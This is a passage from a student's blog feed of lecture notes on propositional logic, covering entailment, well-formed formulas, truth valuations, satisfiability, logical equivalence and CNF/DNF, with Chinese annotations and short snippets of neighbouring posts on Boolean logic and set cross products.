href="#Entailment-and-Validity" class="headerlink" title="Entailment and Validity"></a>Entailment and Validity</h2><p>蕴涵和有效性</p><p>An <strong>argument</strong> consists of a set of propositions called <strong>premises</strong> and a declarative sentence called the <strong>conclusion</strong>.</p><h3 id="Example-of-Toyota-and-Ford"><a href="#Example-of-Toyota-and-Ford" class="headerlink" title="Example of Toyota and Ford"></a>Example of Toyota and Ford</h3><p><strong>Premises</strong>:</p><ul><li><p>Frank took the Ford or the Toyota.</p></li><li><p>If Frank took the Ford he will be late.</p></li><li><p>Frank is not late.</p></li></ul><p><img src="/2024/10/15/Math/Propositional-Logic/Toyota.png" alt></p><p><strong>Conclusion</strong>:</p><p>Frank took the Toyota</p><hr><p>An argument is <strong>valid</strong> <strong>if the conclusions are true whenever all the premises are true</strong>. Thus: if we believe the premises, we should also believe the conclusion.</p><p>(Note: we don’t care what happens when one of the premises is false.)</p><p>Other ways of saying the same thing:</p><ul><li>The conclusion logically follows from the premises.</li><li>The conclusion is a logical consequence of the premises.</li><li>The premises <strong>entail</strong> the conclusion.</li></ul><hr><p>The <strong>argument</strong> <strong>above</strong> is <strong>valid</strong>. The following is <strong>invalid</strong>:</p><p>Premises</p><ul><li>Frank took the Ford or the Toyota.</li><li>If Frank took the Ford he will be late.</li><li>Frank is late.</li></ul><p>Conclusion</p><p>Frank took the Ford.</p><hr><p>The argument above is invalid, please refer to the pic I draw, and the reasoning is that, we cannot judge Frank took the Ford, because he could take the Toyota and hence he was late!</p><hr><h3 id="Example-of-spaceship-and-the-imposters"><a href="#Example-of-spaceship-and-the-imposters" class="headerlink" title="Example of spaceship and the imposters"></a>Example of spaceship and the imposters</h3><p>You are on a spaceship with <strong>crewmates</strong> – who always tell the truth; and <strong>imposters</strong>– who always lie.</p><p>Premises:</p><p>Red says: “Blue is an imposter”</p><p>Green says: “Red and Blue are both crewmates”</p><p>Blue says: “Red is a crewmate, or Green is an imposter”</p><p>Everyone is either a crewmate, or an imposter, but not both</p><p>-&gt; Conclusion: Green is an imposter.</p><hr><p>Jiaojiao: “Later we use propositional logic to prove it”</p><hr><h2 id="Applications-III-Reasoning-About-Requirements-Specifications"><a href="#Applications-III-Reasoning-About-Requirements-Specifications" class="headerlink" title="Applications III: Reasoning About Requirements/Specifications"></a>Applications III: Reasoning About Requirements/Specifications</h2><p>Suppose a set of English language requirements $R$ for a software/hardware system can be formalised by a set of formulas {$φ_1$,…,$φ_n$}.</p><p>Suppose $C$ is a statement formalised by a formula $ψ$. Then</p><ol><li><p>The requirements cannot be implemented if $φ_1 ∧ … ∧ φ_n$ is not satisfiable.</p></li><li><p>If $φ_1,…,φ_n$ entails $ψ$ then every correct implementation of the requirements $R$ will be such that $C$ is always <strong>true</strong> in the resulting system.</p></li><li><p>If $φ<em>1,…,φ</em>{n−1}$ entails $φ_n$, then the condition φn of the specification is <strong>redundant</strong> and need not be stated in the specification.</p></li></ol><hr><p><img src="/2024/10/15/Math/Propositional-Logic/TTT1.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/TTT2.png" alt></p><hr><h3 id="Example-of-alarm-ringing"><a href="#Example-of-alarm-ringing" class="headerlink" title="Example of alarm ringing"></a>Example of alarm ringing</h3><p>Requirements R: A burglar alarm system for a house is to operate as follows. The alarm should not sound unless the system has been armed or there is a fire. If the system has been armed and a door is disturbed, the alarm should ring. Irrespective of whether the system has been armed, the alarm should go off when there is a fire.</p><p>Conclusion C: If the alarm is ringing and there is no fire, then the system must have been armed.</p><p><strong>Questions</strong></p><ol><li><p>Will every system correctly implementing requirements R satisfy C?</p></li><li><p>Is the final sentence of the requirements redundant?</p></li></ol><p>Expressing the requirements as formulas of propositional logic, with</p><ul><li>S = the alarm sounds = the alarm rings</li><li>A = the system is armed</li><li>D = a door is disturbed</li><li>F = there is a fire</li></ul><p>we get</p><p><strong>Requirements</strong>:</p><ol><li><p>$S →(A∨F)$</p></li><li><p>$(A∧D)→S$</p></li><li><p>$F →S$</p></li></ol><p><strong>Conclusion</strong>:</p><script type="math/tex; mode=display">(S ∧ ¬F) → A</script><p>Our two questions then correspond to</p><ol><li><p>Does $S →(A∨F), (A∧D)→S, F →S$ entail $(S ∧¬F) →A$ ?</p></li><li><p>Does $S →(A∨F), (A∧D)→S$ entail $F →S$ ?</p></li></ol><h1 id="Propositional-Logic-formally"><a href="#Propositional-Logic-formally" class="headerlink" title="Propositional Logic, formally"></a>Propositional Logic, formally</h1><h2 id="Syntax-vs-Semantics"><a href="#Syntax-vs-Semantics" class="headerlink" title="Syntax vs Semantics"></a>Syntax vs Semantics</h2><p>The first step in the formal definition of logic is the separation of <strong>syntax</strong> and <strong>semantics</strong></p><ul><li><p>Syntax is how things are written: what defines a formula</p></li><li><p>Semantics is what things mean: what does it mean for a formula to be “true”?</p></li></ul><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p><strong>“Rabbit”</strong> and <strong>“Bunny”</strong> are syntactically different, but semantically the same.</p><h2 id="Syntax-Well-formed-formulas"><a href="#Syntax-Well-formed-formulas" class="headerlink" title="Syntax: Well-formed formulas"></a>Syntax: Well-formed formulas</h2><p>Let $Prop =$ {p,q,r,…} be a set of propositional letters. Consider the alphabet. (Prop is proposition)</p><script type="math/tex; mode=display">Σ=Prop∪\{⊤,⊥,¬,∧,∨,→,↔,(,)\}.</script><p>Prop就是之前我们说的 a(条件a语句),b（条件b语句）,c,d,e,C(常为Conclusion) 这些的，然后Σ是Prop并上逻辑推理符号。</p><p>The <strong>well-formed</strong> <strong>formulas</strong> (wffs) over <strong>Prop</strong> is the smallest set of words over $Σ$ such that:</p><ul><li><strong>⊤, ⊥ and all elements of Prop are wffs</strong></li><li>If φ is a wff then ¬φ is a wf</li><li>If φ and ψ are wffs then (φ∧ψ), (φ∨ψ), (φ → ψ), and (φ ↔ψ) are wffs.</li></ul><h3 id="Examples-2"><a href="#Examples-2" class="headerlink" title="Examples"></a>Examples</h3><p>The following are well-formed formulas:</p><ul><li>(p ∧¬⊤)</li><li>¬(p ∧¬⊤)</li><li>¬¬(p ∧¬⊤)</li></ul><p>The following are <strong>not</strong> well-formed formulas:</p><ul><li>p ∧∧</li><li>p ∧¬⊤</li><li>(p ∧q ∧r)</li><li>¬(¬p)</li></ul><p>注意，<code>∧</code>这种操作符（二元操作符），左右必须有值，且整体被圆括号包裹。<code>¬(¬p)</code>不是wff是因为¬不要加括号，直接写<code>¬¬p</code>就是wff。</p><p><img src="/2024/10/15/Math/Propositional-Logic/wff.png" alt></p><h2 id="Syntax-Conventions"><a href="#Syntax-Conventions" class="headerlink" title="Syntax: Conventions"></a>Syntax: Conventions</h2><p>To aid readability some conventions and binding rules can and will be used [not in proof assistant].</p><p>Parentheses omitted if there is no ambiguity (e.g. p ∧ q)</p><p>¬ binds more tightly than ∧ and ∨, which bind more tightly than → and ↔ (e.g. $p ∧q → r$ instead of $((p ∧q) → r)$</p><p>∧ and ∨ associate to the left: $p∨q∨r$ instead of $((p∨q)∨r)$</p><hr><p>To aid readability some conventions and binding rules can and will be used [not in proof assistant].</p><ul><li>Parentheses omitted if there is no ambiguity (e.g. p ∧ q)</li><li>¬ binds more tightly than ∧ and ∨, which bind more tightly than → and ↔ (e.g. p ∧q → r instead of ((p ∧q) → r)</li><li>∧ and ∨ associate to the left: p∨q∨r instead of ((p∨q)∨r)</li></ul><p>Other conventions (rarely used/assumed in this lecture):</p><ul><li>′ or $\overline{·}$ for ¬</li><li>+ for ∨</li><li>· or juxtaposition for ∧</li><li>∧ binds more tightly than ∨</li><li>→and ↔associate to the right: p → q → r instead of  (p →(q →r))</li></ul><h2 id="Syntax-Parse-trees"><a href="#Syntax-Parse-trees" class="headerlink" title="Syntax: Parse trees"></a>Syntax: Parse trees</h2><p>The structure of well-formed formulas (and other grammar-defined syntaxes) can be shown with a <strong>parse tree</strong>.</p><script type="math/tex; mode=display">((P∧¬Q)∨¬(Q →P))</script><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-11-37-20.png" alt></p><h2 id="Syntax-Parse-trees-formally"><a href="#Syntax-Parse-trees-formally" class="headerlink" title="Syntax: Parse trees formally"></a>Syntax: Parse trees formally</h2><p>Formally, we can define a parse tree as follows:</p><p>A parse tree is either:</p><ul><li>(B) A node containing ⊤;</li><li>(B) A node containing ⊥;</li><li>(B) A node containing a propositional variable;</li><li>(R) A node containing ¬ with a single parse tree child; </li><li>(R) A node containing ∧ with two parse tree children;</li><li>(R) A node containing ∨ with two parse tree children;</li><li>(R) A node containing → with two parse tree children; or</li><li>(R) A node containing ↔ with two parse tree children.</li></ul><h2 id="Semantics-Boolean-Algebras"><a href="#Semantics-Boolean-Algebras" class="headerlink" title="Semantics: Boolean Algebras"></a>Semantics: Boolean Algebras</h2><p>Recall the two-element Boolean Algebra</p><script type="math/tex; mode=display">\mathbb{B} =\{true,false\} = \{T,F\} = \{1,0\}</script><p>together with the operations <code>!, &amp;&amp;, ∥</code>.</p><p>Define $⇝, ↭$ as derived boolean functions:</p><ul><li>x $⇝$y =(!x)∥y =max{1−x,y}</li><li>x $↭$y=(x $⇝$y)&amp;&amp;(y $⇝$x)=(1+x+y)%2)</li></ul><p><img src="/2024/10/15/Math/Propositional-Logic/TT.jpg" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/TT2.jpg" alt></p><h2 id="Semantics-Truth-valuations"><a href="#Semantics-Truth-valuations" class="headerlink" title="Semantics: Truth valuations"></a>Semantics: Truth valuations</h2><p>A <strong>truth assignment</strong> is a function v : $Prop → \mathbb{B}$.</p><p>We can extend a <strong>truth valuation</strong>, v, which assigns a value to all wffs of propositional logic as follows:</p><ul><li>v(⊤) = true,</li><li>v(⊥) = false,</li><li>v(¬φ) =!v(φ),</li><li>v(φ ∧ψ) = v(φ) &amp;&amp; v(ψ)</li><li>v(φ ∨ψ) = v(φ) ∥ v(ψ)</li><li><strong>v(φ →ψ)=v(φ) ⇝v(ψ)</strong></li><li><strong>v(φ ↔ψ)=v(φ) ↭v(ψ)</strong></li></ul><hr><p>A truth assignment is a function v : $Prop → \mathbb{B}$.</p><p>We can extend a truth valuation, v, to all wffs of propositional logic as follows:</p><ul><li>v(⊤) = 1,</li><li>v(⊥) = 0,</li><li>v(¬φ) = 1−v(φ),</li><li>v(φ ∧ψ) = min{v(φ),v(ψ)}</li><li>v(φ ∨ψ) = max{v(φ),v(ψ)}</li><li><strong>v(φ →ψ)=max{1−v(φ),v(ψ)}</strong></li><li><strong>v(φ ↔ψ)=(1+v(φ)+v(ψ)) % 2</strong></li></ul><h2 id="Semantics-Exercises"><a href="#Semantics-Exercises" class="headerlink" title="Semantics: Exercises"></a>Semantics: Exercises</h2><p>Exercises</p><p>Evaluate the following formulas with the truth assignment $v(p) = v(q) = false$</p><ul><li>p →q </li></ul><p>true</p><ul><li>(p →q) →(p →q)</li></ul><p>true</p><ul><li>¬¬p</li></ul><p>false</p><ul><li>⊤∧¬⊥→p</li></ul><p>false</p><h2 id="Semantics-Truth-tables"><a href="#Semantics-Truth-tables" class="headerlink" title="Semantics: Truth tables"></a>Semantics: Truth tables</h2><p>Row for every <strong>truth assignment</strong> — assignment of T/F to elements of Prop</p><p>Columns for <strong>subformulas</strong></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-12-58-02.png" alt></p><h2 id="Satisfiability-and-Equivalence"><a href="#Satisfiability-and-Equivalence" class="headerlink" title="Satisfiability and Equivalence"></a>Satisfiability and Equivalence</h2><p>A formula φ is</p><ul><li><strong>satisfiable</strong> if v(φ) = true for some truth assignment v (v <strong>satisfies</strong> φ)</li><li>a <strong>tautology</strong> if v(φ) = true for all truth assignments v</li><li><strong>unsatisfiable</strong> or a <strong>contradiction</strong> if v(φ) = false for all truth assignments v</li></ul><h2 id="Example-Party-invitations"><a href="#Example-Party-invitations" class="headerlink" title="Example: Party invitations"></a>Example: Party invitations</h2><p> Translation to logic: let J,S,K represent “John (Sarah, Kim) comes to the party”. Then the constraints are:</p><ol><li>J → ¬S</li><li>S →K</li><li>K →J</li></ol><p>Thus, for a successful party to be possible, we want the formula $ψ =(J →¬S)∧(S →K)∧(K →J)$ to be satisfiable. Truth values for J,S,K making this true are called <strong>satisfying<br> assignments</strong>, or <strong>models</strong>.</p><p><strong>We figure out where the conjuncts are false</strong>, below. (so blank = T)</p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-01-37.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/TTTT3.jpg" alt></p><p>Conclusion: a party <strong>satisfying</strong> the constraints can be held. Invite nobody, or invite John only, or invite Kim and John.</p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-02-10.png" alt></p><h2 id="Logical-equivalence-1"><a href="#Logical-equivalence-1" class="headerlink" title="Logical equivalence"></a>Logical equivalence</h2><p>Definition</p><p>Two formulas, φ and ψ, are <strong>logically equivalent</strong>, $φ ≡ ψ, if v(φ) = v(ψ)$ for all truth assignments v.</p><p>Fact</p><p>$≡$ is an equivalence relation.</p><h3 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h3><p>For all propositions P,Q,R:</p><p>Commutativity</p><script type="math/tex; mode=display">P ∨Q ≡ Q∨P \\P ∧Q ≡ Q∧P</script><p>Associativity</p><script type="math/tex; mode=display">(P ∨Q)∨R ≡ P∨(Q∨R) \\(P ∧Q)∧R ≡ P∧(Q∧R)</script><p>Distributivity</p><script type="math/tex; mode=display">P ∨(Q ∧R) ≡ (P∨Q)∧(P∨R)\\P ∧(Q ∨R) ≡ (P∧Q)∨(P∧R)</script><p>Identity</p><script type="math/tex; mode=display">P ∨⊥ ≡ P\\P ∧⊤ ≡ P</script><p>Complement</p><script type="math/tex; mode=display">P ∨¬P ≡ ⊤\\P ∧¬P ≡ ⊥</script><p>Other properties:</p><p>Implication: $p → q ≡ ¬p ∨q$</p><p>Double negation: $¬¬p ≡ p$</p><p>Contrapositive: $(p → q) ≡ (¬q → ¬p)$</p><p>De Morgan’s: $¬(p ∨q) ≡ ¬p ∧¬q$</p><p>Fact</p><p>$φ ≡ψ$ if, and only if, $(φ ↔ ψ)$ is a tautology.</p><p>Strategies for showing logical equivalence:</p><ul><li>Compare all rows of truth table.</li><li>Show $(φ ↔ψ)$ is a tautology.</li><li>Use <strong>transitivity</strong> of $≡$.</li></ul><h3 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h3><p>Prove or disprove:</p><p>(a) $p → (q →r) ≡ (p →q)→(p →r)$</p><p>(c) $(p → q) →r ≡ p→(q→r)$</p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-09-54.png" alt></p><h2 id="Theories-and-entailment"><a href="#Theories-and-entailment" class="headerlink" title="Theories and entailment"></a>Theories and entailment</h2><p>A set of formulas is a <strong>theory</strong>: </p><script type="math/tex; mode=display">T = \{φ1,φ2,...,φn\}</script><p>A truth assignment v <strong>satisfies</strong> a theory T, $if \quad v(φi) = true \text{ for all } φi ∈ T$</p><p>A theory T <strong>entails</strong> a formula $ψ$, $T |= ψ$, if $v(ψ) = true$ for all truth assignments v which satisfy T</p><p>Take Notice</p><p>Other notation (when T = {$φ_1$,$φ_2$,…,$φ_n$})</p><script type="math/tex; mode=display">φ_1,φ_2,...,φ_n |= φ\\φ_1,φ_2,...,φ_n, ∴ φ\\φ_1,φ_2,...,φ_n =⇒ φ</script><h2 id="Entailment-and-Implication"><a href="#Entailment-and-Implication" class="headerlink" title="Entailment and Implication"></a>Entailment and Implication</h2><p>Theorem</p><p>The following are equivalent:</p><script type="math/tex; mode=display">φ_1,φ_2,...,φ_n |= ψ\\∅ |= ((φ_1 ∧φ_2)∧...φ_n) → ψ\\((φ_1 ∧ φ_2) ∧...φ_n) → ψ is a tautology\\∅ |= φ_1 →(φ_2 →(... →(φ_n →ψ)...))\\φ_1 |= φ_2 →(... → (φ_n → ψ)...)</script><p>These last two equivalences can be proven using the following fact.</p><p>Fact</p><p>Let T be a theory, and A and B be propositions. Then</p><script type="math/tex; mode=display">T |= A→B \text{ is equivalent to } T ∪\{A\} |= B.</script><h2 id="Showing-entailment"><a href="#Showing-entailment" class="headerlink" title="Showing entailment"></a>Showing entailment</h2><p>Strategies for showing $φ_1,φ_2,…,φ_n |= ψ$:</p><ul><li>Draw a truth table with columns for $φ_1,…,φ_n$ and $ψ$. Check $ψ$ is true in rows where <strong>all</strong> the $φ_i$ are true.</li><li>Show $((φ_1 ∧φ_2)∧…φ_n) → ψ$ is a tautology.</li><li>Show $φ_1 →(φ_2 →(… → (φ_n →ψ)…))$ is a tautology.</li><li>Show $φ_1 |= φ_2 → (… → (φ_n → ψ)…)$</li><li>Syntactic techniques: Natural deduction, Resolution, etc (not covered here)</li></ul><h3 id="Entailment-example"><a href="#Entailment-example" class="headerlink" title="Entailment example"></a>Entailment example</h3><p>Premises:</p><ul><li>Frank took the Ford or the Toyota.</li><li>If Frank took the Ford he will be late.</li><li>Frank is not late.</li></ul><p>Conclusion:</p><ul><li>Frank took the Toyota</li></ul><p>注意如果三个premise全T，只有这个红色的T这一行；则从结论可以看出蕴含这伙只可能开Tyta。而无法蕴含开Ford是真。(这句话是~错的昂~！原子命题是T或F根本不是判断依据，根本无所谓)</p><p>我们找的是真值表中，所有约束条件为T的情况（与<strong>原子命题</strong>是T、F无关！）我们只找<strong>约束全T</strong>的情况下，<strong>Conclusion是否为T</strong>，则说明几个约束(constraint)推理到结论（Conclusion）是蕴含（entailment）有效的（valid）。</p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-22-44.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-23-06.png" alt></p><p>再看下Sample的题：</p><p><img src="/2024/10/15/Math/Propositional-Logic/ST1.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/ST2.png" alt></p><p>看到几个premise全是T的行，因此 <strong>the premises entail the conclusion</strong>. 因此  <strong>the argument is valid.</strong></p><h3 id="Example-Crewmates-and-Imposters"><a href="#Example-Crewmates-and-Imposters" class="headerlink" title="Example:Crewmates and Imposters"></a>Example:Crewmates and Imposters</h3><p>Because I did the note for the first time, there may be some mistake and insufficient understanding of the knowledge. Please refer to my the other articles to help: 1. <em>improper-atomic-and-entailment</em> 2. <em>truth-table-solves-imposter-and-crewmate</em></p><p>Premises: </p><ul><li>Everyoneiseitheracrewmate,oranimposter,<br>butnotboth</li><li>Red: “Blue is an imposter”</li><li>Green: “Red and Blue are both crewmates”</li><li>Blue: “Red is a crewmate,or Green is an imposter”</li></ul><p>Conclusion: </p><ul><li>Green is an imposter</li></ul><p>Translation to logic: Let R, G, B represent “Red (Green, Blue) is a crewmate”.</p><p>Then the constraints are:</p><p>Premises:</p><ul><li>Everyone is either a crewmate, or an imposter, but not both</li><li>$φ_1 =R ↔¬B$</li><li>Green: “Red and Blue are both crewmates”</li><li>Blue: “Red is a crewmate, or Green is an imposter”</li></ul><p>Conclusion: </p><ul><li>Green is an imposter</li></ul><p><img src="/2024/10/15/Math/Propositional-Logic/JT2.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-27-06.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-27-19.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-27-32.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-13-28-42.png" alt></p><h1 id="CNF-and-DNF-Revisited"><a href="#CNF-and-DNF-Revisited" class="headerlink" title="CNF and DNF Revisited"></a>CNF and DNF Revisited</h1><p>Definition</p><ul><li>A literal is an expression p or ¬p, where p is a propositional atom.</li><li>A propositional formula is in CNF (conjunctive normal form) if it has the form</li></ul><script type="math/tex; mode=display">\underset{i}{\land}C_i \\% \lor</script><p>where each clause Ci is a disjunction of literals e.g.  $p ∨q∨¬r$.</p><p>A propositional formula is in DNF (disjunctive normal form) if it has the form</p><script type="math/tex; mode=display">\underset{i}{\lor}C_i \\</script><p>where each <strong>clause</strong> $C_i$ is a conjunction of literals e.g. $p ∧q∧¬r$.</p><p>Take Notice</p><p>CNF and DNF are syntactic forms.</p><p>Theorem</p><p>For every Boolean expression $φ$, there exists an equivalent expression in conjunctive normal form and an equivalent expression in disjunctive normal form.</p><h1 id="Beyond-Propositional-Logic"><a href="#Beyond-Propositional-Logic" class="headerlink" title="Beyond Propositional Logic"></a>Beyond Propositional Logic</h1><h2 id="Limitations-to-Propositional-Logic"><a href="#Limitations-to-Propositional-Logic" class="headerlink" title="Limitations to Propositional Logic"></a>Limitations to Propositional Logic</h2><p>Propositional logic is unable to capture several useful phenomena:</p><ul><li>Spatial/temporal dependence (e.g. P holds <strong>after</strong> Q holds)</li><li>Belief and knowledge (e.g. I know that you know that X holds)</li><li>Relationships between propositions (e.g. “The sky is blue” and “my eyes are blue”)</li><li>Quantification (e.g. “All men are mortal”)</li></ul><h2 id="Beyond-Propositional-Logic-1"><a href="#Beyond-Propositional-Logic-1" class="headerlink" title="Beyond Propositional Logic"></a>Beyond Propositional Logic</h2><p><strong>Modal logic</strong>: Introduce <strong>modalities</strong> to capture statement qualifying.</p><p>Example</p><p>Temporal logic:</p><ul><li>$F φ: φ$ will be true at some point in the future</li><li>$G φ: φ$ will be true at all points in the future</li><li>$φU ψ: φ$ will be true until $ψ$ holds</li></ul><p><strong>First order logic/Predicate logic</strong>: Add relations (predicates) and quantifiers to capture relationships between propositions.</p><p>Example</p><ul><li>P: All men are mortal: $∀x Man(x) → Mortal(x)$</li><li>Q: Socrates is a man: $Man(Socrates)$</li><li>R: Socrates is mortal: $Mortal(Socrates)$</li></ul><p>In propositional logic, there is no connection between P, Q and R: it is not the case that $P,Q |= R$.</p><p>In first-order logic you can show $P,Q |= R$.</p><p><strong>Second order logic</strong>: Add quantification of relations.</p><h2 id="Limitations"><a href="#Limitations" class="headerlink" title="Limitations"></a>Limitations</h2><p>More expressive logics require more complex semantics.</p><ul><li>Logical equivalence harder to show</li><li>Entailment harder to show</li><li>Connections between different concepts not so straightforward</li></ul><p>Example</p><p>In Temporal Logic, a valuation is a function $v : Prop × \mathbb{N} → \mathbb{B}$ - i.e. truth tables that change over time.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学渣考试答题模板</title>
      <link href="/2024/10/14/Math/%E5%AD%A6%E6%B8%A3%E8%80%83%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF/"/>
      <url>/2024/10/14/Math/%E5%AD%A6%E6%B8%A3%E8%80%83%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/14/Math/%E5%AD%A6%E6%B8%A3%E8%80%83%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF/answer.jpg" alt></p><p>正如tutor所言，</p><h1 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h1><p>Given</p><h1 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h1><p>To prove</p><h1 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h1><p>Hence</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Domain Set Cross Product and values</title>
      <link href="/2024/10/13/Math/Domain-Set-Cross-Product-and-values/"/>
      <url>/2024/10/13/Math/Domain-Set-Cross-Product-and-values/</url>
      
        <content type="html"><![CDATA[<p>Firstly, take notice that we cannot add brackets of cross product, which are totally different.</p><script type="math/tex; mode=display">A \times A \times A \neq (A \times A) \times A \neq A \times (A \times A)</script><p><img src="/2024/10/13/Math/Domain-Set-Cross-Product-and-values/111.png" alt></p><p>And, take notice of the <strong>on</strong>. If <strong>on N</strong>, means <strong>aRb</strong>, it’s a pair <strong>(a,b)</strong>. If <strong>on $\mathbb{N} \times \mathbb{N}$</strong>, its <strong>(a,b)R(c,d)</strong>, namely <strong>((a,b),(c,d))</strong>.</p><p><img src="/2024/10/13/Math/Domain-Set-Cross-Product-and-values/domain_of_pairs.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Boolean logic</title>
      <link href="/2024/10/12/Math/Boolean-logic/"/>
      <url>/2024/10/12/Math/Boolean-logic/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#what-is-logic">What is logic</a><ul><li><a href="#loose-history-of-logic">Loose history of logic</a></li><li><a href="#logic-in-computer-science">Logic in Computer Science</a></li></ul></li><li><a href="#boolean-logic">Boolean Logic</a><ul><li><a href="#the-boolean-algebra-mathbbb">The Boolean Algebra $\mathbb{B}$</a></li><li><a href="#alternative-notation">Alternative notation</a></li><li><a href="#alternative-notation-1">Alternative notation</a></li><li><a href="#propertiescommutativityassociativitydistributionidentitycomplementation">Properties:Commutativity,Associativity,Distribution,Identity,Complementation</a></li></ul></li><li><a href="#boolean-functions">Boolean Functions</a><ul><li><a href="#example">example</a></li><li><a href="#application-adding-two-one-bit-numbers">Application: Adding two one-bit numbers</a></li></ul></li><li><a href="#conjunctive-and-disjunctive-normal-form">Conjunctive and Disjunctive Normal Form</a><ul><li><a href="#examples">Examples</a></li><li><a href="#2-theorems">2 Theorems</a></li></ul></li><li><a href="#canonical-dnf">Canonical DNF</a><ul><li><a href="#theorem">Theorem</a></li><li><a href="#exercise">Exercise</a></li></ul></li><li><a href="#karnaugh-maps">Karnaugh Maps</a><ul><li><a href="#proof-process-of-karnaugh-maps-k-maps-for-short">proof process of Karnaugh Maps (K Maps for short)</a></li><li><a href="#why-how-to-use-karnaugh-maps">Why, how to use Karnaugh Maps</a></li><li><a href="#how-to-correctly-circle-to-eliminate-variables">how to correctly circle to eliminate variables?</a></li><li><a href="#example-1">example</a></li><li><a href="#exercise-1">Exercise</a></li></ul></li><li><a href="#boolean-algebras">Boolean Algebras</a><ul><li><a href="#definition">definition</a></li><li><a href="#property">property</a></li><li><a href="#example-2">Example</a></li><li><a href="#proofs-in-boolean-algebras">Proofs in Boolean Algebras</a></li><li><a href="#duality">Duality</a><ul><li><a href="#definition-1">Definition</a></li><li><a href="#definition-2">Definition</a></li><li><a href="#theorem-principle-of-duality">Theorem (Principle of duality)</a></li><li><a href="#example-3">Example</a></li></ul></li></ul></li></ul><h1 id="What-is-logic"><a href="#What-is-logic" class="headerlink" title="What is logic"></a>What is logic</h1><p>Logic is about <strong>formalizing reasoning</strong> and <strong>defining truth</strong></p><ul><li>Adding rigour</li><li>Removing ambiguity</li><li>Mechanizing the process of reasoning</li></ul><h2 id="Loose-history-of-logic"><a href="#Loose-history-of-logic" class="headerlink" title="Loose history of logic"></a>Loose history of logic</h2><p>(Ancient times): Logic exclusive to philosophy<br>Mid-19th Century: Logical foundations of Mathematics (Boole, Jevons, Schr¨oder, etc)<br>1910: Russell and Whitehead’s Principia Mathematica<br>1928: Hilbert proposes Entscheidungsproblem<br>1931: G¨odel’s Incompleteness Theorem<br>1935: Church’s Lambda calculus<br>1936: Turing’s Machine-based approach<br>1930s: Shannon develops Circuit logic<br>1960s: Formal verification; Relational databases</p><h2 id="Logic-in-Computer-Science"><a href="#Logic-in-Computer-Science" class="headerlink" title="Logic in Computer Science"></a>Logic in Computer Science</h2><p>Computation = Calculation + Symbolic manipulation</p><p>Logic as 2-valued computation (Boolean logic):</p><ul><li>Circuit design</li><li>Code optimization</li><li>Boolean algebra</li><li>Nand game</li></ul><p>Logic as symbolic reasoning (Propositional logic, and beyond):</p><ul><li>Formal verification</li><li>Proof assistance</li><li>Knowledge Representation and Reasoning</li><li>Automated reasoning</li><li>Databases</li></ul><h1 id="Boolean-Logic"><a href="#Boolean-Logic" class="headerlink" title="Boolean Logic"></a>Boolean Logic</h1><p>Boolean logic is about performing calculations in a “simple” mathematical structure.</p><ul><li>complex calculations can be built entirely from these simple ones</li><li>can help identify simplifications that improve performance at the circuit level</li><li>can help identify simplifications that improve presentation at the programming level</li></ul><h2 id="The-Boolean-Algebra-mathbb-B"><a href="#The-Boolean-Algebra-mathbb-B" class="headerlink" title="The Boolean Algebra $\mathbb{B}$"></a>The Boolean Algebra $\mathbb{B}$</h2><p>Definition</p><p>The (two-element) <strong>Boolean algebra</strong> is defined to be the set $\mathbb{B}$ ={0,1}, together with the functions </p><script type="math/tex; mode=display">!: \mathbb{B} \to \mathbb{B}, \&\&: \mathbb{B}^2 → \mathbb{B}, \quad and \quad ||: \mathbb{B}^2 → \mathbb{B}</script><p>, defined as follows:</p><script type="math/tex; mode=display">!x = (1−x) \\x \&\&y =min\{x,y\} \\x ∥ y =max\{x,y\}</script><h2 id="Alternative-notation"><a href="#Alternative-notation" class="headerlink" title="Alternative notation"></a>Alternative notation</h2><p>For $\mathbb{B}$</p><script type="math/tex; mode=display">\mathbb{B} = \{ \text{false}, \text{true} \} \quad \text{or} \quad \mathbb{B} = \{ F, T \} \quad \text{or} \quad \mathbb{B} = \{ 0, 1 \} \quad \text{or} \quad \mathbb{B} = \{ \bot, \top \}</script><p>For $!x$</p><script type="math/tex; mode=display">\overline{x} \quad !x \quad \text{or} \quad x' \quad \text{or} \quad \sim x \quad \text{or} \quad \neg x \quad \text{or} \quad \text{NOT}(x)</script><p>For $x \&amp;\&amp; y$</p><script type="math/tex; mode=display">x \land y \quad \text{or} \quad xy \quad \text{or} \quad x \wedge y \quad \text{or} \quad (x \, \text{AND} \, y)</script><p>For $x || y$</p><script type="math/tex; mode=display">x \lor y \quad \text{or} \quad x + y \quad \text{or} \quad (x \, \text{OR} \, y)</script><h2 id="Alternative-notation-1"><a href="#Alternative-notation-1" class="headerlink" title="Alternative 